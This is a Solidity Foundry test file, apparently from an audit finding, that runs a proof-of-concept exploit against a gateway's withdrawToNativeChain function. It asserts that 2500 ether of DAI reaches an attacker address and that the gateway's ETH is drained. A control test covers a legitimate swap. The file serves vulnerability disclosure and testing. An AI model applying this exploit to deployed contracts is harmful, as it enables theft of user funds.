// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./58581-h-4-gatewaytransfernativewithdrawtonativechain-allows-swappi.sol";

contract DodoArbitraryFromTokenTest is Test {
    function test_exploit_swapArbitraryZrc20() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.stolen(), 2500 ether);
        assertEq(e.dai().balanceOf(address(e.attackerRecv())), 2500 ether);
        assertEq(e.eth().balanceOf(address(e.gateway())), 0);
        assertEq(e.dai().balanceOf(address(e.gateway())), 1 ether);
    }

    function test_control_matchedFromTokenUsesDeposit() public {
        Exploit e = new Exploit();
        // Fund router with ETH so a legitimate DAI→ETH swap can pay out.
        e.eth().mint(address(e.router()), 1 ether);
        e.router().setPrice(address(e.dai()), address(e.eth()), 1 ether);
        e.dai().mint(address(this), 1 ether);
        e.dai().approve(address(e.gateway()), 1 ether);

        uint256 before = e.eth().balanceOf(address(this));
        e.gateway().withdrawToNativeChain(
            address(e.dai()),
            1 ether,
            address(e.dai()), // fromToken matches deposit
            address(e.eth()),
            1 ether,
            address(this)
        );
        assertEq(e.eth().balanceOf(address(this)) - before, 1 ether);
    }
}
